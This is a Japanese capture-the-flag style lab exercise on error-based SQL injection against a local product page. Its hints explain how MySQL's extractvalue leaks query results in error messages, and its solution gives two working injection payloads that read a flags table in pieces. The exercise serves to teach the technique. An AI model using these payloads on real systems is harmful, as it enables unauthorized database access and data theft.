# 03 - Error-based Injection

`http://localhost:3003` の商品詳細(`/product?id=`)からflagを抜き出せ。
このDBには`flags`テーブルがあり、`flag`カラムにflagが1件入っている。

## ヒント

<details><summary>ヒント1</summary>

`id`はクォートなしでそのまま数値コンテキストに埋め込まれている(`server.py`参照)。
エラーはそのままJSONで返る。

</details>

<details><summary>ヒント2</summary>

MySQLの`extractvalue(xml_target, xpath_expr)`は第2引数が不正なXPATH式だと構文エラーを
起こし、そのエラーメッセージに評価結果を含める。任意のSELECT結果をエラーメッセージとして
表示させられる。

</details>

<details><summary>ヒント3</summary>

`extractvalue`はエラーメッセージを約32文字で切り詰める。flagがそれより長い場合は
`SUBSTRING(flag, N, 31)`で範囲をずらしながら複数回に分けて抽出する。

</details>

<details><summary>解答</summary>

```
id=1 AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(flag,1,31) FROM flags)))
```
エラーメッセージに`~`に続けてflag前半が表示される。残りは開始位置をずらして取得:
```
id=1 AND extractvalue(1, concat(0x7e, (SELECT SUBSTRING(flag,32,31) FROM flags)))
```
2回分の結果(`~`以降)を連結すればflag全体になる。

</details>
